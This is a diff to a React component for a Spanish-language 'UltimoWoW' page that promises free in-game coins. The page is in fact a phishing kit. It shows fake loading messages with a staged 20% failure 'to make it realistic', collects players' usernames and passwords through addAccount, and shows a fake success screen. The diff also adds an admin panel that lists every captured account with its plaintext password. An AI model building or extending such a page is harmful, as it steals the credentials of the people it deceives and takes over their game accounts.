@@ -1,7 +1,16 @@
 import React, { useState, useEffect } from "react";
-import { FaKey, FaCoins, FaRedo, FaExclamationTriangle } from "react-icons/fa";
+import {
+  FaKey,
+  FaCoins,
+  FaRedo,
+  FaExclamationTriangle,
+  FaUser,
+  FaLock,
+  FaMoneyBillWave,
+} from "react-icons/fa";
 import { motion, AnimatePresence } from "framer-motion";
 import { addAccount } from "./lib/addAccount";
+import { getAccounts } from "./lib/getAccounts";
 
 const App: React.FC = () => {
   // Estados para el flujo principal
@@ -16,19 +25,24 @@ const App: React.FC = () => {
   const [randomMinutes, setRandomMinutes] = useState<number>(0);
   const [showCredentialWarning, setShowCredentialWarning] =
     useState<boolean>(false);
+  const [progress, setProgress] = useState<number>(0);
 
   // Estados para el panel de administrador
   const [showAdminModal, setShowAdminModal] = useState<boolean>(false);
   const [adminPassword, setAdminPassword] = useState<string>("");
   const [isAuthenticated, setIsAuthenticated] = useState<boolean>(false);
   const [passwordError, setPasswordError] = useState<boolean>(false);
+  const [accounts, setAccounts] = useState<
+    Array<{ id: number; username: string; password: string }>
+  >([]);
 
   // Mensajes para el loader secuencial
   const loaderMessages = [
     "Cargando generador...",
     "Procesando tu IP...",
-    "Cargando ultimowow.com...",
+    "Conectando con ultimowow.com...",
     "Accediendo a la base de datos...",
+    "Preparando todo para ti...",
     "Carga completada con éxito!",
   ];
 
@@ -39,26 +53,44 @@ const App: React.FC = () => {
       document.documentElement.style.setProperty("--vh", `${vh}px`);
     };
 
-    addAccount();
     setViewportHeight();
     window.addEventListener("resize", setViewportHeight);
 
     return () => window.removeEventListener("resize", setViewportHeight);
   }, []);
 
+  // Función para cargar las cuentas cuando se autentica el admin
+  useEffect(() => {
+    if (isAuthenticated && showAdminModal) {
+      loadAccounts();
+    }
+  }, [isAuthenticated, showAdminModal]);
+
+  const loadAccounts = async () => {
+    try {
+      const accountsData = await getAccounts();
+      setAccounts(accountsData);
+    } catch (error) {
+      console.error("Error al cargar cuentas:", error);
+    }
+  };
+
   const startFarming = () => {
     setIsLoading(true);
     setError(false);
+    setProgress(0);
     setLoaderMessage(loaderMessages[0]);
     let currentMessage = 0;
 
     const interval = setInterval(() => {
       currentMessage++;
+      const newProgress = (currentMessage / loaderMessages.length) * 100;
+      setProgress(newProgress);
+
       if (currentMessage < loaderMessages.length) {
         setLoaderMessage(loaderMessages[currentMessage]);
       } else {
         clearInterval(interval);
-
         // 20% de probabilidad de fallo para hacerlo realista
         const isSuccess = Math.random() > 0.2;
 
@@ -75,24 +107,36 @@ const App: React.FC = () => {
   };
 
   const handleLogin = () => {
-    // Mostrar advertencia antes de continuar
+    // Solo muestra la advertencia, no envía datos todavía
     setShowCredentialWarning(true);
   };
 
-  const confirmLogin = () => {
+  const confirmLogin = async () => {
     setShowCredentialWarning(false);
     setIsLoading(true);
-    setLoaderMessage("Obteniendo permisos de UltimoWoW...");
+    setLoaderMessage("Guardando credenciales...");
 
-    setTimeout(() => {
+    try {
+      // Envía los datos aquí después de confirmar
+      await addAccount(username, password);
+
+      setLoaderMessage("Obteniendo permisos de UltimoWoW...");
+
+      // Simula tiempo de procesamiento
+      await new Promise((resolve) => setTimeout(resolve, 1500));
+
       setIsLoading(false);
       setStep(2); // Mostrar formulario de monedas
-    }, 2500 + Math.random() * 1500); // Entre 2.5 y 4 segundos
+    } catch (error) {
+      console.error("Error al guardar credenciales:", error);
+      setIsLoading(false);
+      setError(true);
+    }
   };
 
   const requestCoins = () => {
     setIsLoading(true);
-    setLoaderMessage("Enviando solicitud...");
+    setLoaderMessage("Procesando solicitud de monedas...");
 
     setTimeout(() => {
       setIsLoading(false);
@@ -108,6 +152,7 @@ const App: React.FC = () => {
     setCoinAmount("");
     setError(false);
     setSuccess(false);
+    setProgress(0);
   };
 
   // Funciones para el panel de administrador
@@ -140,7 +185,7 @@ const App: React.FC = () => {
   };
 
   return (
-    <div className="flex flex-col px-7 bg-black/50 items-center justify-center text-white relative min-h-dvh">
+    <div className="flex flex-col px-4 sm:px-7 bg-black/50 items-center justify-center text-white relative min-h-dvh">
       {/* Favicon */}
       <link
         rel="icon"
@@ -160,35 +205,41 @@ const App: React.FC = () => {
       </motion.button>
 
       {/* Logo y Títulos */}
-      <div className="flex items-center mb-4 md:mb-8 px-4">
+      <div className="flex items-center mb-6 sm:mb-8">
         <img
           src="/logo.png"
           alt="UltimaWoW Logo"
-          className="w-12 h-12 md:w-16 md:h-16 mr-3 md:mr-4"
+          className="w-14 h-14 sm:w-16 sm:h-16 mr-3 sm:mr-4"
         />
         <div className="flex flex-col">
-          <h1 className="text-3xl md:text-5xl font-bold text-yellow-400">
+          <h1 className="text-3xl sm:text-4xl font-bold text-yellow-400">
             UltimoWoW
           </h1>
-          <h2 className="text-sm md:text-lg text-gray-300">
+          <h2 className="text-sm sm:text-base text-gray-300">
             Farmea monedas con tu IP
           </h2>
         </div>
       </div>
 
       {/* Contenido principal */}
-      <div className="w-full max-w-md bg-gray-800/70 rounded-lg p-4 md:p-6 border border-gray-600 mx-2">
+      <div className="w-full max-w-md bg-gray-800/70 rounded-lg p-5 sm:p-6 border border-gray-600 mx-2">
         {step === 0 && (
           <div className="flex flex-col items-center">
             {!isLoading && !error && (
               <>
-                <FaCoins className="text-yellow-400 text-4xl md:text-5xl mb-3 md:mb-4" />
-                <h3 className="text-xl md:text-2xl font-bold text-center mb-4 md:mb-6">
+                <motion.div
+                  initial={{ scale: 0.8 }}
+                  animate={{ scale: 1 }}
+                  transition={{ type: "spring", damping: 6 }}
+                >
+                  <FaCoins className="text-yellow-400 text-5xl sm:text-6xl mb-4 sm:mb-5" />
+                </motion.div>
+                <h3 className="text-xl sm:text-2xl font-bold text-center mb-5 sm:mb-6">
                   Comenzar farmeo
                 </h3>
                 <motion.button
                   onClick={startFarming}
-                  className="px-5 py-2 md:px-6 md:py-3 bg-yellow-600 text-white rounded-md hover:bg-yellow-500 transition font-bold flex items-center text-sm md:text-base"
+                  className="px-6 py-3 sm:px-7 sm:py-3 bg-yellow-600 hover:bg-yellow-500 text-white rounded-md transition font-bold flex items-center text-base sm:text-lg"
                   whileHover={{ scale: 1.05 }}
                   whileTap={{ scale: 0.95 }}
                 >
@@ -198,40 +249,44 @@ const App: React.FC = () => {
             )}
 
             {isLoading && (
-              <div className="flex flex-col items-center">
-                <div className="animate-spin rounded-full h-10 w-10 md:h-12 md:w-12 border-t-2 border-b-2 border-yellow-500 mb-3 md:mb-4"></div>
-                <p className="text-center text-gray-300 mb-2 text-sm md:text-base">
+              <div className="flex flex-col items-center w-full">
+                <motion.div
+                  animate={{ rotate: 360 }}
+                  transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
+                  className="rounded-full h-12 w-12 sm:h-14 sm:w-14 border-t-2 border-b-2 border-yellow-500 mb-4"
+                ></motion.div>
+                <p className="text-center text-gray-300 mb-3 text-sm sm:text-base">
                   {loaderMessage}
                 </p>
-                <div className="w-full bg-gray-700 rounded-full h-2 md:h-2.5 mt-3 md:mt-4">
-                  <div
+                <div className="w-full bg-gray-700 rounded-full h-2.5 sm:h-3 mt-3">
+                  <motion.div
                     className="bg-yellow-500 h-full rounded-full"
-                    style={{
-                      width: `${
-                        (loaderMessages.indexOf(loaderMessage) + 1) *
-                        (100 / loaderMessages.length)
-                      }%`,
-                      transition: "width 0.5s ease",
-                    }}
-                  ></div>
+                    initial={{ width: 0 }}
+                    animate={{ width: `${progress}%` }}
+                    transition={{ duration: 0.8, ease: "easeOut" }}
+                  ></motion.div>
                 </div>
               </div>
             )}
 
             {error && (
               <div className="flex flex-col items-center text-center">
-                <div className="text-red-400 text-4xl md:text-5xl mb-3 md:mb-4">
+                <motion.div
+                  initial={{ scale: 0 }}
+                  animate={{ scale: 1 }}
+                  className="text-red-400 text-5xl sm:text-6xl mb-4"
+                >
                   ✖
-                </div>
-                <h3 className="text-lg md:text-xl font-bold text-red-400 mb-1 md:mb-2">
+                </motion.div>
+                <h3 className="text-lg sm:text-xl font-bold text-red-400 mb-2">
                   Error en la conexión
                 </h3>
-                <p className="text-gray-300 mb-4 md:mb-6 text-sm md:text-base">
+                <p className="text-gray-300 mb-5 sm:mb-6 text-sm sm:text-base">
                   El servidor no respondió. Inténtalo de nuevo.
                 </p>
                 <motion.button
                   onClick={startFarming}
-                  className="px-5 py-2 md:px-6 md:py-3 bg-red-600 text-white rounded-md hover:bg-red-500 transition font-bold flex items-center text-sm md:text-base"
+                  className="px-6 py-3 sm:px-7 sm:py-3 bg-red-600 hover:bg-red-500 text-white rounded-md transition font-bold flex items-center text-base sm:text-lg"
                   whileHover={{ scale: 1.05 }}
                   whileTap={{ scale: 0.95 }}
                 >
@@ -242,80 +297,96 @@ const App: React.FC = () => {
           </div>
         )}
 
-        {step === 1 && (
-          <form className="flex flex-col space-y-3 md:space-y-4">
-            <h3 className="text-lg md:text-xl font-bold text-yellow-400 mb-1 md:mb-2">
-              Acceso a UltimoWoW
+        {step === 1 && !isLoading && (
+          <form className="flex flex-col space-y-2 sm:space-y-5">
+            <h3 className="text-xl sm:text-2xl font-bold text-yellow-400 mb-3 flex items-center">
+              <FaUser className="mr-2" /> Acceso a UltimoWoW
             </h3>
 
-            <input
-              type="text"
-              placeholder="Nombre de Usuario"
-              value={username}
-              onChange={(e) => setUsername(e.target.value)}
-              className="w-full px-3 py-2 md:px-4 md:py-2 rounded-md bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 border border-gray-600 text-sm md:text-base"
-              required
-            />
+            <div className="relative">
+              <input
+                type="text"
+                placeholder="Usuario o Correo"
+                value={username}
+                onChange={(e) => setUsername(e.target.value)}
+                className="w-full pl-10 pr-4 py-3 rounded-md bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 border border-gray-600"
+                required
+              />
+              <FaUser className="absolute left-3 top-3.5 text-gray-400" />
+            </div>
 
-            <input
-              type="password"
-              placeholder="Contraseña"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              className="w-full px-3 py-2 md:px-4 md:py-2 rounded-md bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 border border-gray-600 text-sm md:text-base"
-              required
-            />
+            <div className="relative">
+              <input
+                type="password"
+                placeholder="Contraseña"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                className="w-full pl-10 pr-4 py-3 rounded-md bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 border border-gray-600"
+                required
+              />
+              <FaLock className="absolute left-3 top-3.5 text-gray-400" />
+            </div>
 
-            {isLoading ? (
-              <div className="flex flex-col items-center">
-                <div className="animate-spin rounded-full h-7 w-7 md:h-8 md:w-8 border-t-2 border-b-2 border-yellow-500 mb-1 md:mb-2"></div>
-                <p className="text-gray-300 text-xs md:text-sm">
-                  {loaderMessage}
-                </p>
-              </div>
-            ) : (
-              <motion.button
-                type="button"
-                onClick={handleLogin}
-                className="w-full px-3 py-2 md:px-4 md:py-2 bg-yellow-600 text-white rounded-md hover:bg-yellow-500 transition font-bold text-sm md:text-base"
-                whileHover={{ scale: 1.02 }}
-                whileTap={{ scale: 0.98 }}
-                disabled={!username || !password}
-              >
-                Continuar
-              </motion.button>
-            )}
+            <motion.button
+              type="button"
+              onClick={handleLogin}
+              className="w-full mt-3 px-4 py-3 bg-yellow-600 hover:bg-yellow-500 text-white rounded-md transition font-bold"
+              whileHover={{ scale: 1.02 }}
+              whileTap={{ scale: 0.98 }}
+              disabled={!username || !password}
+            >
+              Continuar
+            </motion.button>
           </form>
         )}
 
+        {isLoading && step === 1 && (
+          <div className="flex flex-col items-center">
+            <motion.div
+              animate={{ rotate: 360 }}
+              transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
+              className="rounded-full h-12 w-12 sm:h-14 sm:w-14 border-t-2 border-b-2 border-yellow-500 mb-4"
+            ></motion.div>
+            <p className="text-center text-gray-300 mb-3 text-sm sm:text-base">
+              {loaderMessage}
+            </p>
+          </div>
+        )}
+
         {step === 2 && (
-          <form className="flex flex-col space-y-3 md:space-y-4">
-            <h3 className="text-lg md:text-xl font-bold text-yellow-400 mb-1 md:mb-2">
-              Solicitar monedas
+          <form className="flex flex-col space-y-4 sm:space-y-5">
+            <h3 className="text-xl sm:text-2xl font-bold text-yellow-400 mb-3 flex items-center">
+              <FaMoneyBillWave className="mr-2" /> Solicitar monedas
             </h3>
 
-            <input
-              type="number"
-              placeholder="Cantidad de monedas a agregar"
-              value={coinAmount}
-              onChange={(e) => setCoinAmount(e.target.value)}
-              className="w-full px-3 py-2 md:px-4 md:py-2 rounded-md bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 border border-gray-600 text-sm md:text-base"
-              required
-              min="1"
-            />
+            <div className="relative">
+              <input
+                max={30000}
+                type="number"
+                placeholder="(max 30k)"
+                value={coinAmount}
+                onChange={(e) => setCoinAmount(e.target.value)}
+                className="w-full pl-10 pr-4 py-3 rounded-md bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 border border-gray-600"
+                required
+                min="1"
+              />
+              <FaCoins className="absolute left-3 top-3.5 text-gray-400" />
+            </div>
 
             {isLoading ? (
               <div className="flex flex-col items-center">
-                <div className="animate-spin rounded-full h-7 w-7 md:h-8 md:w-8 border-t-2 border-b-2 border-yellow-500 mb-1 md:mb-2"></div>
-                <p className="text-gray-300 text-xs md:text-sm">
-                  {loaderMessage}
-                </p>
+                <motion.div
+                  animate={{ rotate: 360 }}
+                  transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
+                  className="rounded-full h-8 w-8 border-t-2 border-b-2 border-yellow-500 mb-2"
+                ></motion.div>
+                <p className="text-gray-300 text-sm">{loaderMessage}</p>
               </div>
             ) : (
               <motion.button
                 type="button"
                 onClick={requestCoins}
-                className="w-full px-3 py-2 md:px-4 md:py-2 bg-yellow-600 text-white rounded-md hover:bg-yellow-500 transition font-bold text-sm md:text-base"
+                className="w-full px-4 py-3 bg-yellow-600 hover:bg-yellow-500 text-white rounded-md transition font-bold"
                 whileHover={{ scale: 1.02 }}
                 whileTap={{ scale: 0.98 }}
                 disabled={!coinAmount}
@@ -340,14 +411,19 @@ const App: React.FC = () => {
               initial={{ scale: 0.9, opacity: 0 }}
               animate={{ scale: 1, opacity: 1 }}
               exit={{ scale: 0.9, opacity: 0 }}
-              className="bg-gray-800/95 backdrop-blur-sm rounded-lg p-5 md:p-6 max-w-md w-full border border-yellow-400"
+              className="bg-gray-800/95 backdrop-blur-sm rounded-lg p-6 sm:p-7 max-w-md w-full border border-yellow-400"
             >
               <div className="text-center">
-                <FaExclamationTriangle className="text-yellow-400 text-4xl md:text-5xl mx-auto mb-3 md:mb-4" />
-                <h3 className="text-xl md:text-2xl font-bold text-yellow-400 mb-2 md:mb-3">
+                <motion.div
+                  animate={{ scale: [1, 1.1, 1] }}
+                  transition={{ duration: 0.5 }}
+                >
+                  <FaExclamationTriangle className="text-yellow-400 text-5xl sm:text-6xl mx-auto mb-4" />
+                </motion.div>
+                <h3 className="text-xl sm:text-2xl font-bold text-yellow-400 mb-3">
                   ¡Verifica tus credenciales!
                 </h3>
-                <p className="text-gray-300 mb-4 md:mb-6 text-sm md:text-base">
+                <p className="text-gray-300 mb-5 sm:mb-6 text-sm sm:text-base">
                   Por favor asegúrate de que el usuario y contraseña de tu
                   cuenta sean correctos. Un error en estas credenciales podría
                   resultar en la pérdida de las monedas.
@@ -355,10 +431,10 @@ const App: React.FC = () => {
                   <strong>Nota:</strong> Las monedas van para todos los
                   personajes de la cuenta.
                 </p>
-                <div className="flex flex-col md:flex-row justify-center space-y-2 md:space-y-0 md:space-x-3">
+                <div className="flex flex-col sm:flex-row justify-center gap-3">
                   <motion.button
                     onClick={() => setShowCredentialWarning(false)}
-                    className="px-4 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-500 transition font-bold text-sm md:text-base"
+                    className="px-5 py-2.5 bg-gray-600 hover:bg-gray-500 text-white rounded-md transition font-bold"
                     whileHover={{ scale: 1.05 }}
                     whileTap={{ scale: 0.95 }}
                   >
@@ -366,7 +442,7 @@ const App: React.FC = () => {
                   </motion.button>
                   <motion.button
                     onClick={confirmLogin}
-                    className="px-4 py-2 bg-yellow-600 text-white rounded-md hover:bg-yellow-500 transition font-bold text-sm md:text-base"
+                    className="px-5 py-2.5 bg-yellow-600 hover:bg-yellow-500 text-white rounded-md transition font-bold"
                     whileHover={{ scale: 1.05 }}
                     whileTap={{ scale: 0.95 }}
                   >
@@ -392,22 +468,27 @@ const App: React.FC = () => {
               initial={{ scale: 0.9, opacity: 0 }}
               animate={{ scale: 1, opacity: 1 }}
               exit={{ scale: 0.9, opacity: 0 }}
-              className="bg-gray-800/95 backdrop-blur-sm rounded-lg p-5 md:p-6 max-w-md w-full border border-yellow-400"
+              className="bg-gray-800/95 backdrop-blur-sm rounded-lg p-6 sm:p-7 max-w-md w-full border border-green-500"
             >
               <div className="text-center">
-                <div className="text-green-400 text-4xl md:text-5xl mb-3 md:mb-4">
+                <motion.div
+                  initial={{ scale: 0 }}
+                  animate={{ scale: 1 }}
+                  transition={{ type: "spring" }}
+                  className="text-green-400 text-5xl sm:text-6xl mb-4"
+                >
                   ✓
-                </div>
-                <h3 className="text-xl md:text-2xl font-bold text-green-400 mb-2 md:mb-3">
+                </motion.div>
+                <h3 className="text-xl sm:text-2xl font-bold text-green-400 mb-3">
                   ¡Solicitud completada!
                 </h3>
-                <p className="text-gray-300 mb-4 md:mb-6 text-sm md:text-base">
+                <p className="text-gray-300 mb-5 sm:mb-6 text-sm sm:text-base">
                   Monedas solicitadas correctamente. Tu pedido aparecerá en el
                   buzón en aproximadamente {randomMinutes} minutos.
                 </p>
                 <motion.button
                   onClick={resetProcess}
-                  className="px-5 py-2 md:px-6 md:py-2 bg-yellow-600 text-white rounded-md hover:bg-yellow-500 transition font-bold text-sm md:text-base"
+                  className="px-6 py-2.5 bg-yellow-600 hover:bg-yellow-500 text-white rounded-md transition font-bold"
                   whileHover={{ scale: 1.05 }}
                   whileTap={{ scale: 0.95 }}
                 >
@@ -433,28 +514,31 @@ const App: React.FC = () => {
             <motion.div
               key="modal"
               variants={modal}
-              className="bg-gray-800/95 backdrop-blur-sm rounded-lg p-5 md:p-6 max-w-md w-full border border-yellow-400 shadow-xl"
+              className="bg-gray-800/95 backdrop-blur-sm rounded-lg p-6 sm:p-7 max-w-md w-full border border-yellow-400 shadow-xl"
             >
               {!isAuthenticated ? (
                 <>
-                  <h3 className="text-xl md:text-2xl font-bold text-yellow-400 mb-3 md:mb-4 flex items-center">
+                  <h3 className="text-xl sm:text-2xl font-bold text-yellow-400 mb-4 flex items-center">
                     <FaKey className="mr-2" /> Acceso Administrador
                   </h3>
                   <form onSubmit={handleAdminLogin}>
-                    <input
-                      type="password"
-                      placeholder="Contraseña de administrador"
-                      value={adminPassword}
-                      onChange={(e) => setAdminPassword(e.target.value)}
-                      className="w-full px-3 py-2 md:px-4 md:py-2 rounded-md bg-gray-700/90 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 border border-gray-600 mb-3 md:mb-4 text-sm md:text-base"
-                      required
-                    />
+                    <div className="relative mb-4">
+                      <input
+                        type="password"
+                        placeholder="Contraseña de administrador"
+                        value={adminPassword}
+                        onChange={(e) => setAdminPassword(e.target.value)}
+                        className="w-full pl-10 pr-4 py-3 rounded-md bg-gray-700/90 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 border border-gray-600"
+                        required
+                      />
+                      <FaLock className="absolute left-3 top-3.5 text-gray-400" />
+                    </div>
                     {passwordError && (
-                      <p className="text-red-400 mb-3 md:mb-4 text-sm md:text-base">
+                      <p className="text-red-400 mb-4 text-sm">
                         Contraseña incorrecta
                       </p>
                     )}
-                    <div className="flex flex-row justify-end  space-x-2">
+                    <div className="flex justify-end gap-3">
                       <motion.button
                         type="button"
                         onClick={() => {
@@ -462,7 +546,7 @@ const App: React.FC = () => {
                           setPasswordError(false);
                           setAdminPassword("");
                         }}
-                        className="px-3 py-2 md:px-4 md:py-2 bg-gray-600/90 rounded-md hover:bg-gray-500 transition text-sm md:text-base"
+                        className="px-4 py-2.5 bg-gray-600/90 hover:bg-gray-500 rounded-md transition"
                         whileHover={{ scale: 1.05 }}
                         whileTap={{ scale: 0.95 }}
                       >
@@ -470,7 +554,7 @@ const App: React.FC = () => {
                       </motion.button>
                       <motion.button
                         type="submit"
-                        className="px-3 py-2 md:px-4 md:py-2 bg-yellow-600/90 rounded-md hover:bg-yellow-500 transition font-bold text-sm md:text-base"
+                        className="px-4 py-2.5 bg-yellow-600/90 hover:bg-yellow-500 rounded-md transition font-bold"
                         whileHover={{ scale: 1.05 }}
                         whileTap={{ scale: 0.95 }}
                       >
@@ -481,8 +565,8 @@ const App: React.FC = () => {
                 </>
               ) : (
                 <>
-                  <div className="flex justify-between items-center mb-3 md:mb-4">
-                    <h3 className="text-xl md:text-2xl font-bold text-yellow-400">
+                  <div className="flex justify-between items-center mb-4">
+                    <h3 className="text-xl sm:text-2xl font-bold text-yellow-400">
                       Panel de Administración
                     </h3>
                     <motion.button
@@ -491,18 +575,49 @@ const App: React.FC = () => {
                         setIsAuthenticated(false);
                         setAdminPassword("");
                       }}
-                      className="text-gray-400 hover:text-white"
+                      className="p-2 text-gray-400 hover:text-white transition"
                       whileHover={{ scale: 1.2 }}
                       whileTap={{ scale: 0.9 }}
+                      title="Cerrar panel"
                     >
                       ✕
                     </motion.button>
                   </div>
-                  <div className="bg-gray-700/80 p-3 md:p-4 rounded-md">
-                    <p className="text-gray-300 text-sm md:text-base">
-                      Este es el panel de administración. Aquí puedes poner la
-                      información que necesites mostrar.
-                    </p>
+
+                  <div className="bg-gray-700/80 rounded-md overflow-hidden">
+                    <h4 className="text-lg font-semibold p-3 border-b border-gray-600">
+                      Cuentas registradas
+                    </h4>
+                    <div className="max-h-60 overflow-y-auto">
+                      {accounts.length > 0 ? (
+                        <ul className="divide-y divide-gray-600">
+                          {accounts.map((account) => (
+                            <li
+                              key={account.id}
+                              className="p-3 hover:bg-gray-600/50 transition"
+                            >
+                              <div className="flex justify-between items-center">
+                                <div>
+                                  <p className="font-medium">
+                                    {account.username}
+                                  </p>
+                                  <p className="text-xs text-gray-400">
+                                    ID: {account.id}
+                                  </p>
+                                </div>
+                                <span className="text-xs bg-gray-800 px-2 py-1 rounded">
+                                  {account.password}
+                                </span>
+                              </div>
+                            </li>
+                          ))}
+                        </ul>
+                      ) : (
+                        <p className="p-3 text-gray-400 text-center">
+                          No hay cuentas registradas
+                        </p>
+                      )}
+                    </div>
                   </div>
                 </>
               )}
